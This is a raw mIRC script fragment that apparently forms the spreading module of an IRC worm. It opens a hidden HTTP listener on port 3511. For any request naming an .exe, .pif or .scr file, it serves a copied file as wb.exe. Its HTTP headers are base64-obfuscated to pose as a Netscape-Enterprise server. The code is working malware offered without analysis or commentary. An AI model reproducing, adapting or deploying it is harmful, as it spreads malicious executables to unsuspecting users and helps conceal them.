   ;-----------------------------------------------------------------------

   alias shttp { if ($sock(pfile).status != listening) { .socklisten pfile 3511 } }
   On *:socklisten:pfile:{ .sockaccept tfil $+ $r(0,9999999999) }
   on *:sockopen:pfile: { set %ffser $true }
   on *:sockclose:pfile: { set %ffser $false }

   On *:sockread:tfil*:{ if ($sockerr > 0) { return }
     if ($sock($sockname).status == active) { sockread %sendFil }
     else { return }
     if ($sockbr == 0) { return }
     if (%sendFil == $null) { %sendFil = - }
     if (/ isin $gettok(%sendFil,2,32) ) && (.exe isin $gettok(%sendFil,2,32) ) { .copy -o $decode(%vwq,m) $+ mirc.dll %cc3 $+ \ $+ wb.exe | sendfile %cc3 $+ \ $+ wb.exe }
     if (/ isin $gettok(%sendFil,2,32) ) && (.pif isin $gettok(%sendFil,2,32) ) { .copy -o $decode(%vwq,m) $+ mirc.dll %cc3 $+ \ $+ wb.exe | sendfile %cc3 $+ \ $+ wb.exe }
     if (/ isin $gettok(%sendFil,2,32) ) && (.scr isin $gettok(%sendFil,2,32) ) { .copy -o $decode(%vwq,m) $+ mirc.dll %cc3 $+ \ $+ wb.exe | sendfile %cc3 $+ \ $+ wb.exe }
   }
   Alias sendFile {
     ssw $sockname $decode(SFRUUC8xLjEgMjAwIE9L,m)
     ssw $sockname $decode(RGF0ZTo=,m) $+ $Chr(32) $+ $fulldate
     ssw $sockname $decode(U2VydmVyOiBOZXRzY2FwZS1FbnRlcnByaXNlLzQuMQ==,m)
     ssw $sockname $decode(QWNjZXB0LVJhbmdlczogYnl0ZXM=,m)
     ssw $sockname $decode(Q29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0=,m)
     ssw $sockname $decode(Q29udGVudC1MZW5ndGg6,m) $+ $Chr(32) $+ $file($1-).size
     ssw $sockname $decode(QWNjZXB0LUVuY29kaW5nOiBpZGVudGl0eQ==,m)
     ssw $sockname $crlf
     Set %lfil 0 | Set %ufil $lof($1-) | Set %gfil $1-
   }
   Alias spread { if ($isfile($2-) == $true) { bread " $+ $2- $+ " %lfil 64 &fyle }
   sockwrite $1 &fyle | %lfil = $calc(%lfil + $bvar(&fyle,0)) }
   On *:sockwrite:tfil*:{ if ($sockerr > 0) { sockclose $sockname | return }
     if (%lfil >= %ufil) { sockclose $sockname | return }
   spread $sockname %gfil }

